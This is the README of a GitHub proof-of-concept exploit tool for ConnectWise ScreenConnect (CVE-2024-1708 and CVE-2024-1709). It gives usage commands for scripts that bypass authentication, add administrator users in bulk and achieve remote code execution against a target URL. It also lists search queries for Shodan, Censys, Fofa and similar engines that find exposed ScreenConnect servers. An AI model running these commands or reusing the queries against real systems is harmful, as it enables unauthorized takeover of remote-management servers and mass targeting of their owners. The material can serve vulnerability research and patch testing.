# How to use

I'm using `Python3.9`.

```
pip install requests
# python check.py
python batchAdduser.py
```

![](https://github.com/W01fh4cker/ScreenConnect-AuthBypass-POC-EXP/assets/101872898/9f9be7be-d607-4fcf-97dc-2d8a4939db5e)

```text
python ScreenConnect-AuthBypass-RCE.py -h

usage: ScreenConnect-AuthBypass-RCE.py [-h] [-u USERNAME] [-p PASSWORD] -t TARGET [-d DOMAIN] [--proxy PROXY]
                                                                                                             
CVE-2024-1708 && CVE-2024-1709 --> RCE!!!                                                                    
                                                                                                             
optional arguments:                                                                                          
  -h, --help            show this help message and exit                                                      
  -u USERNAME, --username USERNAME                                                                           
                        username you want to add                                                             
  -p PASSWORD, --password PASSWORD
                        password you want to add
  -t TARGET, --target TARGET
                        target url
  -d DOMAIN, --domain DOMAIN
                        Description of domain
  --proxy PROXY         eg: http://127.0.0.1:8080
```
For example:
```shell
python ScreenConnect-AuthBypass-RCE.py -t http://192.168.9.100
```

![](https://github.com/W01fh4cker/ScreenConnect-AuthBypass-POC-EXP/assets/101872898/c6d6a60e-433f-4f80-807d-dc7bc061cb96)

# Cyberspace mapping statement

## Odin

```
services.modules.http.headers.server:"screenconnect"
```

## Zoomeye
```
app:"ScreenConnect Remote Management Software"
```

## Censys

```
services.http.response.headers:(key: `Server` and value.headers: `ScreenConnect`)
```

## Shodan

```
"Server: ScreenConnect"
```

## Hunter.how

```
product.name="ConnectWise ScreenConnect software"
```

## Fofa

```
app="ScreenConnect-Remote-Support-Software"
```

# Reference

https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8

https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc
